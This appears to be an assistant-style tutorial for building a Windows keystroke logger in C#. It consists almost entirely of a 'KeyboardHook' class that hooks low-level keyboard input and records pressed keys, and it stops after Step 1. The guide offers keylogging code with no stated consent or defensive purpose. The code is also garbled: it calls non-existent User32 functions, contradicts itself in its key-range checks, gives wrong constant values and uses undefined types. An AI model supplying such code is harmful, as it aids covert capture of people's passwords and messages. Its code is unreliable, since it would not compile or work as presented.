To create a keystroke logger on a Windows computer, you can use the Windows API's SetWindowsHook function to capture keyboard input. Here's a step-by-step guide:

### Step 1: Create a Class for Keyboard Hook
We'll create a class `KeyboardHook` to manage the hooking process and keystroke logging.

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;

public class KeyboardHook
{
    private static readonly int VK_KEY_FIRST = 0x20;
    private static readonly int VK_KEY_LAST = 0x3A;
    private static readonly int WH_KEYBOARD_LL = 12;

    private readonly object locker = new object();
    private List<int> pressedKeys;
    private bool isHooked;
    private IntPtr hookHandle;
    private int threadId;

    public KeyboardHook()
    {
        pressedKeys = new List<int>();
    }

    public bool StartLogging()
    {
        lock (locker)
        {
            if (isHooked)
                return false;

            hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardCallback);
            isHooked = true;
            threadId = Process.GetCurrentThreadId();
            var error = new Error();
            if (!SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardCallback, threadId, out error))
            {
                ShowError(error);
                return false;
            }
        }
        return true;
    }

    public void StopLogging()
    {
        lock (locker)
        {
            if (!isHooked)
                return;

            UnsetWindowsHookEx(hookHandle);
            hookHandle = IntPtr.Zero;
            isHooked = false;
        }
    }

    private static int KeyboardCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode != 0)
            return CallNextHook(wParam, lParam);

        var key = (int)wParam;
        lock (locker)
        {
            if (key >= VK_KEY_FIRST && key <= VK_KEY_LAST)
            {
                if (key >= 0x30 && key <= 0x5A) // Letters A-Z, a-z
                {
                    pressedKeys.Add(key);
                }
                else if (key >= 0x40 && key <= 0x7E) // Symbols and other keys
                {
                    pressedKeys.Add(key);
                }
            }
        }
        return 0;
    }

    private static int CallNextHook(IntPtr hwnd, IntPtr lParam)
    {
        return (int)SendMessage(hwnd, WM_KEYUP, wParam: 0, lParam);
    }

    private static int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam)
    {
        return (int)User32.SendMessage(hwnd, wMsg, wParam, lParam);
    }

    [DllImport("User32.dll")]
    private static extern int SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, out Error error);

    [DllImport("User32.dll")]
    private static extern bool UnsetWindowsHookEx(IntPtr hHook);

    [DllImport("User32.dll")]
    private static extern int CallNextHook(IntPtr hwnd, IntPtr lParam);

    [DllImport("User32.dll")]
    private static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);

    [DllImport("User32.dll")]
    private static extern int GetLastInputSize(IntPtr hinput);
    private static readonly int WM_KEYUP = 0x29;

    private static void ShowError(Error error)
    {
        MessageBox.Show("Error setting up keyboard hook: " + error.Message, "Error", MessageBoxButtons.OK);
    }
}
```

